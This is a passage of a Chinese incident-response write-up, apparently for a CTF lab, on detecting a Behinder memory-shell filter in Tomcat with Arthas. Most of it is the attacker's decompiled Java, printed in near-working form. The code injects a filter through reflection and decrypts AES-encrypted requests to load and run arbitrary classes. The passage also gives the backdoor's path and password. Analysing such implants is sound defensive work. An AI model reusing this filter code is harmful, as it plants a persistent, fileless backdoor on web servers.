+</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 75*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="o">.</span><span class="nx">getWriter</span><span class="p">()</span><span class="o">.</span><span class="k">print</span><span class="p">(</span><span class="nx">tag_s</span> <span class="o">+</span> <span class="nx">output</span><span class="o">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="nx">tag_e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 76*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="o">.</span><span class="nx">getWriter</span><span class="p">()</span><span class="o">.</span><span class="nx">flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 77*/</span>             <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="o">.</span><span class="nx">getWriter</span><span class="p">()</span><span class="o">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">exception</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// empty catch block
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 81*/</span>         <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="nx">void</span> <span class="nx">parseObj</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">block8</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 85*/</span>             <span class="k">if</span> <span class="p">(</span><span class="nx">obj</span><span class="o">.</span><span class="nx">getClass</span><span class="p">()</span><span class="o">.</span><span class="nx">isArray</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 86*/</span>                 <span class="nx">Object</span><span class="p">[]</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">(</span><span class="nx">Object</span><span class="p">[])</span><span class="nx">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 87*/</span>                 <span class="k">this</span><span class="o">.</span><span class="nx">request</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HttpServletRequest</span><span class="p">)</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 88*/</span>                 <span class="k">this</span><span class="o">.</span><span class="nx">response</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HttpServletResponse</span><span class="p">)</span><span class="nx">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 91*/</span>                     <span class="nx">Class</span><span class="o">&lt;</span><span class="cp">?&gt;</span><span class="err"> clazz = Class.forName(&#34;javax.servlet.jsp.PageContext&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/* 92*/                     this.request = (HttpServletRequest)clazz.getDeclaredMethod(&#34;getRequest&#34;, new Class[0]).invoke(obj, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/* 93*/                     this.response = (HttpServletResponse)clazz.getDeclaredMethod(&#34;getResponse&#34;, new Class[0]).invoke(obj, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                        catch (Exception var8) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/* 95*/                     if (!(obj instanceof HttpServletRequest)) break block8;
+</span></span></span><span class="line"><span class="cl"><span class="err">/* 96*/                     this.request = (HttpServletRequest)obj;
+</span></span></span><span class="line"><span class="cl"><span class="err">                            try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/* 99*/                         Field req = this.request.getClass().getDeclaredField(&#34;request&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*100*/                         req.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*101*/                         HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*102*/                         Field resp = request2.getClass().getDeclaredField(&#34;response&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*103*/                         resp.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*104*/                         this.response = (HttpServletResponse)resp.get(request2);
+</span></span></span><span class="line"><span class="cl"><span class="err">                            }
+</span></span></span><span class="line"><span class="cl"><span class="err">                            catch (Exception var7) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                                try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*107*/                             this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod(&#34;getResponse&#34;, new Class[0]).invoke(obj, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">                                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                                catch (Exception exception) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                                    // empty catch block
+</span></span></span><span class="line"><span class="cl"><span class="err">                                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                            }
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            /*
+</span></span></span><span class="line"><span class="cl"><span class="err">             * WARNING - Removed try catching itself - possible behaviour change.
+</span></span></span><span class="line"><span class="cl"><span class="err">             */
+</span></span></span><span class="line"><span class="cl"><span class="err">            public String addFilter() throws Exception {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*118*/         ServletContext servletContext = this.request.getServletContext();
+</span></span></span><span class="line"><span class="cl"><span class="err">/*119*/         BehinderFilter filter = this;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*120*/         String filterName = this.path;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*121*/         String url = this.path;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*122*/         if (servletContext.getFilterRegistration(filterName) == null) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                    String var11;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*123*/             Field contextField = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*124*/             ApplicationContext applicationContext = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*125*/             StandardContext standardContext = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*126*/             Field stateField = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*127*/             FilterRegistration.Dynamic filterRegistration = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    try {
+</span></span></span><span class="line"><span class="cl"><span class="err">                        String var25;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        Class&lt;?&gt; filterMap;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*131*/                 contextField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*132*/                 contextField.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*133*/                 applicationContext = (ApplicationContext)contextField.get(servletContext);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*134*/                 contextField = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*135*/                 contextField.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*136*/                 standardContext = (StandardContext)contextField.get(applicationContext);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*137*/                 stateField = LifecycleBase.class.getDeclaredField(&#34;state&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*138*/                 stateField.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*139*/                 stateField.set(standardContext, LifecycleState.STARTING_PREP);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*140*/                 filterRegistration = servletContext.addFilter(filterName, (Filter)filter);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*141*/                 filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+</span></span></span><span class="line"><span class="cl"><span class="err">/*142*/                 Method filterStartMethod = StandardContext.class.getMethod(&#34;filterStart&#34;, new Class[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*143*/                 filterStartMethod.setAccessible(true);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*144*/                 filterStartMethod.invoke(standardContext, null);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*145*/                 stateField.set(standardContext, LifecycleState.STARTED);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*146*/                 Object var112 = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*150*/                     filterMap = Class.forName(&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                        catch (Exception var21) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*152*/                     filterMap = Class.forName(&#34;org.apache.catalina.deploy.FilterMap&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">/*155*/                 Method findFilterMaps = standardContext.getClass().getMethod(&#34;findFilterMaps&#34;, new Class[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*156*/                 Object[] filterMaps = (Object[])findFilterMaps.invoke(standardContext, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*158*/                 for (int i = 0; i &lt; filterMaps.length; ++i) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*159*/                     Object filterMapObj = filterMaps[i];
+</span></span></span><span class="line"><span class="cl"><span class="err">                            findFilterMaps = filterMap.getMethod(&#34;getFilterName&#34;, new Class[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">                            String name = (String)findFilterMaps.invoke(filterMapObj, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*162*/                     if (!name.equalsIgnoreCase(filterName)) continue;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*163*/                     filterMaps[i] = filterMaps[0];
+</span></span></span><span class="line"><span class="cl"><span class="err">/*164*/                     filterMaps[0] = filterMapObj;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                        String string = var25 = &#34;Success&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*173*/                 stateField.set(standardContext, LifecycleState.STARTED);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*169*/                 return string;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    catch (Exception var22) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*171*/                 var11 = var22.getMessage();
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    finally {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*173*/                 stateField.set(standardContext, LifecycleState.STARTED);
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">/*176*/             return var11;
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">/*178*/         return &#34;Filter already exists&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*183*/         HttpSession session = ((HttpServletRequest)req).getSession();
+</span></span></span><span class="line"><span class="cl"><span class="err">/*184*/         Object lastRequest = req;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*185*/         Object lastResponse = resp;
+</span></span></span><span class="line"><span class="cl"><span class="err">/*188*/         if (!(lastRequest instanceof RequestFacade)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*189*/             Method getRequest = null;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*191*/                 getRequest = ServletRequestWrapper.class.getMethod(&#34;getRequest&#34;, new Class[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*192*/                 lastRequest = getRequest.invoke(this.request, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*194*/                 while (!(lastRequest instanceof RequestFacade)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*195*/                     lastRequest = getRequest.invoke(lastRequest, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    catch (Exception exception) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                        // empty catch block
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*203*/             if (!(lastResponse instanceof ResponseFacade)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*204*/                 Method getResponse = ServletResponseWrapper.class.getMethod(&#34;getResponse&#34;, new Class[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*205*/                 lastResponse = getResponse.invoke(this.response, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*207*/                 while (!(lastResponse instanceof ResponseFacade)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*208*/                     lastResponse = getResponse.invoke(lastResponse, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">                    }
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                catch (Exception getResponse) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                    // empty catch block
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                HashMap&lt;String, Object&gt; obj = new HashMap&lt;String, Object&gt;();
+</span></span></span><span class="line"><span class="cl"><span class="err">/*216*/         obj.put(&#34;request&#34;, lastRequest);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*217*/         obj.put(&#34;response&#34;, lastResponse);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*218*/         obj.put(&#34;session&#34;, session);
+</span></span></span><span class="line"><span class="cl"><span class="err">                try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*221*/             session.putValue(&#34;u&#34;, (Object)this.Pwd);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*222*/             Cipher c = Cipher.getInstance(&#34;AES&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*223*/             c.init(2, new SecretKeySpec(this.Pwd.getBytes(), &#34;AES&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="err">                    new BehinderFilter(this.getClass().getClassLoader()).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                catch (Exception var7) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*226*/             var7.printStackTrace();
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            public byte[] base64Decode(String str) throws Exception {
+</span></span></span><span class="line"><span class="cl"><span class="err">                try {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*233*/             Class&lt;?&gt; clazz = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*234*/             return (byte[])clazz.getMethod(&#34;decodeBuffer&#34;, String.class).invoke(clazz.newInstance(), str);
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">                catch (Exception var5) {
+</span></span></span><span class="line"><span class="cl"><span class="err">/*236*/             Class&lt;?&gt; clazz = Class.forName(&#34;java.util.Base64&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*237*/             Object decoder = clazz.getMethod(&#34;getDecoder&#34;, new Class[0]).invoke(null, new Object[0]);
+</span></span></span><span class="line"><span class="cl"><span class="err">/*238*/             return (byte[])decoder.getClass().getMethod(&#34;decode&#34;, String.class).invoke(decoder, str);
+</span></span></span><span class="line"><span class="cl"><span class="err">                }
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            public void init(FilterConfig filterConfig) throws ServletException {
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            public void destroy() {
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">Affect(row-cnt:1) cost in 803 ms.
+</span></span></span><span class="line"><span class="cl"><span class="err">[arthas@1]$
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<h2 id="3应急响应排查出黑客留下的后门提交后门路径" class="heading-element"><span>3.【应急响应】排查出黑客留下的后门，提交后门路径</span>
+  <a href="#3%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e6%8e%92%e6%9f%a5%e5%87%ba%e9%bb%91%e5%ae%a2%e7%95%99%e4%b8%8b%e7%9a%84%e5%90%8e%e9%97%a8%e6%8f%90%e4%ba%a4%e5%90%8e%e9%97%a8%e8%b7%af%e5%be%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="o">/</span><span class="nx">xia0le</span><span class="o">.</span><span class="nx">ico</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>tcpdump抓包发现有密码和后门路径</p>
+<p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746583619825-20250507100716-dwnsgft.png" alt="QQ_1746583619825" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746583619825-20250507100716-dwnsgft.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746583619825-20250507100716-dwnsgft.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746583619825-20250507100716-dwnsgft.png?size=large 2x" data-title="QQ_1746583619825" style="--width: 2192px;--aspect-ratio: 2192 / 1624;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="4应急响应排查出黑客留下的后门提交密码" class="heading-element"><span>4.【应急响应】排查出黑客留下的后门，提交密码</span>
+  <a href="#4%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e6%8e%92%e6%9f%a5%e5%87%ba%e9%bb%91%e5%ae%a2%e7%95%99%e4%b8%8b%e7%9a%84%e5%90%8e%e9%97%a8%e6%8f%90%e4%ba%a4%e5%af%86%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="nx">pass2025</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<h2 id="5安全加固修复后门后访问web-check页面拿到flag提交" class="heading-element"><span>5.【安全加固】修复后门后访问web-check页面拿到flag提交</span>
+  <a href="#5%e5%ae%89%e5%85%a8%e5%8a%a0%e5%9b%ba%e4%bf%ae%e5%a4%8d%e5%90%8e%e9%97%a8%e5%90%8e%e8%ae%bf%e9%97%aeweb-check%e9%a1%b5%e9%9d%a2%e6%8b%bf%e5%88%b0flag%e6%8f%90%e4%ba%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>直接过滤Filter类发现冰蝎马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">sc</span> <span class="o">*</span><span class="nx">Filter</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602801117-20250507152644-2saedqz.png" alt="QQ_1746602801117" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602801117-20250507152644-2saedqz.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602801117-20250507152644-2saedqz.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602801117-20250507152644-2saedqz.png?size=large 2x" data-title="QQ_1746602801117" style="--width: 1576px;--aspect-ratio: 1576 / 480;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>反编译</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">jad</span> <span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="o">.</span><span class="nx">BehinderFilter</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602752770-20250507152612-bkqlhxc.png" alt="QQ_1746602752770" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602752770-20250507152612-bkqlhxc.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602752770-20250507152612-bkqlhxc.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746602752770-20250507152612-bkqlhxc.png?size=large 2x" data-title="QQ_1746602752770" style="--width: 2556px;--aspect-ratio: 2556 / 1228;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里就是用来接受远程传递来的值解密进行命令执行</p>
+<p>‍</p>
+<p>arthas查看com.summersec.x.BehinderFilter的hash码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">arthas</span><span class="o">@</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span> <span class="nx">sc</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="o">.</span><span class="nx">BehinderFilter</span> <span class="o">|</span> <span class="nx">grep</span> <span class="nx">classLoaderHash</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">classLoaderHash</span>   <span class="mi">53</span><span class="nx">a38d25</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">arthas</span><span class="o">@</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span> 
+</span></span></code></pre></td></tr></table>
